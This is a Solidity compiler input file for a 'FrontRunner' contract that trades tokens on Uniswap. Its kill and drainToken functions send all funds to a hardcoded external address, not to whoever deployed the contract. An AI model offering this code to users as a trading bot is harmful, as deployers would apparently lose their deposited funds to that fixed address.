{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/course.sol":{"content":"pragma solidity ^0.6.1;\r\n\r\ncontract FrontRunner {\r\n    address payable private manager;\r\n    address payable private EOA=0x671d5e69bfbb8ee405BdDA6A17F88B16a6E6928B;\r\n\r\n    event Received(address sender, uint256 amount);\r\n    event UniswapEthBoughtActual(uint256 amount);\r\n    event UniswapTokenBoughtActual(uint256 amount);\r\n    \r\n        receive() external payable {\r\n        emit Received(msg.sender, msg.value);\r\n    }\r\n\r\n    modifier restricted() {\r\n        require(msg.sender == manager, \"manager allowed only\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        manager = msg.sender;\r\n    }\r\n    \r\nfunction ethToToken(uint256 minTokens, uint256 deadline, address payable _uni) external restricted {\r\n    Uniswap uni = Uniswap(_uni);\r\n    uint256 ethBalance = address(this).balance;\r\n    uint256 tokensBoughtActual = uni.ethToTokenSwapInput.value(ethBalance)({ min_tokens: minTokens, deadline: deadline });\r\n    emit UniswapTokenBoughtActual(tokensBoughtActual);\r\n}\r\n\r\n    function tokenToEth(uint256 tokensToSell, uint256 minEth, uint256 deadline, address payable _uni) external restricted {\r\n     Uniswap uni = Uniswap(_uni);\r\n        uint256 actualEthBought = uni.tokenToEthSwapInput({ tokens_sold: tokensToSell, min_eth: minEth, deadline: deadline });\r\n        emit UniswapEthBoughtActual(actualEthBought);\r\n    }\r\n\r\n    function kill() external restricted {\r\n        selfdestruct(EOA);\r\n    }\r\n\r\n    function approve(ERC20 _token, address payable _uni) external restricted {\r\n        ERC20 token = ERC20(_token);\r\n        token.approve(_uni, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF);\r\n    }\r\n\r\n    function drainToken(ERC20 _token, uint256 etAmount) external restricted {\r\n        ERC20 token = ERC20(_token);\r\n        //uint tokenBalance = token.balanceOf(address(this));\r\n        token.transfer(EOA, etAmount);\r\n    }\r\n\r\n}\r\n\r\n    abstract contract ERC20 {\r\n        function balanceOf(address account) external virtual view returns (uint256);\r\n        function transfer(address recipient, uint256 amount) external virtual returns (bool);\r\n        function approve(address spender, uint tokens) public virtual returns (bool success);\r\n    }\r\n\r\n   abstract contract Uniswap {\r\n    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external virtual payable returns (uint256  tokens_bought);\r\n    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external virtual returns (uint256  eth_bought);\r\n}"}}}